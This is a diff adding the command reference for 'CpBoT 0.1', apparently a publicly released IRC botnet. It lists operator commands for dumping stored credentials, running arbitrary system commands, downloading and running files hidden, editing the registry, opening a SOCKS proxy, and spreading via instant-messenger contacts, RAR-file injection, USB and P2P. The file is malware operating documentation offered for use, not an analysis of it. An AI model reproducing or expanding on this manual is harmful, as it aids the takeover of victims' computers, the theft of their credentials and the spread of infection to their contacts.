@@ -1,0 +1,90 @@
+|_________       __________     ___________ |
+|\_   ___ \______\______   \ ___\__    ___/ |
+|/    \  \/\____ \|    |  _//  _ \|    |    |
+|\     \___|  |_> >    |   (  <_> )    |    |
+| \______  /   __/|______  /\____/|____|    |
+|        \/|__|          \/                 |
+|-------------------------------------------|
+|CpBoT 0.1 Public Release		    |
+|-------------------------------------------|
+
+[·O· » CpBoT Command List « ·O·]
+
+» Login/Logout
+.login/.l <password>					// Login
+.logout/.lo			-			// Logout
+.who							// Displays logged in users
+
+» Utility Commands
+.remove/.bye						// Removes the bot (-s hides your host on quit msg)
+.threads/.t [kill <all/#>]				// Displays/kills threads
+.netstatp/.nsp [port] [-N/-a]				// Displays connections (xp only)
+.uptime/.up						// Displays the bots uptime
+.version/.v [id]					// Displays bots version (will ignore if botid==id
+.flusharp/.farp						// Flushes arp cache
+.flushdns/.fdns						// Flushes dns cache
+.resolve/.dns						// Resolves a ip/host
+.process/.ps [list <p.exe>]				// List process(es)
+.process/.ps <kill> <pid/p.exe>				// Kill pid or process	
+.iestart/.ies [page]					// Sets or views the internet explorer startpage
+.visit [url]						// Visits specified url
+
+» IRC Commands
+.join/.j						// joins a channel
+.part/.p						// parts a channel
+.raw/.r							// sends a raw to the irc server
+.prefix/.pr						// changes the bot prefix
+.randnick/.rand						// generates a new random nick and switches to it
+
+» Information Gathering
+.pstore/.pst						// displays the bots protected storage
+//.sniffer						// starts packet sniffer // removed
+.sysinfo/.si						// displays the bots system information
+.netinfo/.ni [mb/gb]					// displays the bots network information
+.driveinfo/.di [mb/gb] [total]				// displays the bots drive information
+
+» Random Shit
+.mirccmd <command>					// sends a command to any open mIRC window
+.system <command>					// runs a command with system()
+.msn.add <example@hotmail.com>                          // Add specified contact to MSN messenger
+
+» File Management
+.file type/cat <file>					// displays a files contents
+.file exists/e <file>					// checks if a file/die exists
+.file del/rm <file>					// deletes a file
+.file rmdir <dir>					// deletes a dir (and a files in it)
+.file move <f1> <f2> [-r]				// moves a file
+.file copy <f1> <f2> [-r/-O]				// copys a file (-O: overwrite?)
+.file attrib <file> [-S/H/R/N]				// sets a file attributes
+
+» Download/Update
+.down <filetodl> <save> [r] [h]				// downloads a file (r: run, h: run hidden)
+.update <filetodl> <save> <id>				// updates bot if botid!=id
+
+» If/Else Commands
+.if/.else nick <nick> <do this> (wildcards supported)   // Example: .if nick *USA* .remove
+.if/.else host <host> <do this> (wildcards supported)   // Example: .if host *.com* .inject
+.if/.else id <bot id> <do this>
+.if/.else up <time> <do this>
+.if/.else connected <time> <do this>
+
+» reg control - still testing
+.reg query <type> <root> <subkey> <key>
+.reg query <root> <subkey>
+.reg delete <root> <subkey> [key]
+.reg write <type> <root> <subkey> <key> <value>
+
+» Daomons
+.s4 [port]						// starts a socks 4 server
+
+» Spreading
+.msn.msg <message> 					// sends message to MSN contacts, if installed
+.aim.msg <message>					// sends message to AIM contacts, if installed
+.triton.msg <message>					// sends message to TRITON contacts, if installed
+.inject						 	// searches for .RAR files and injects "screensaver.scr" into it
+							// Filename can be edited.
+USB Spreads automaticly.
+P2P Spreads automaticly.
+
+
+
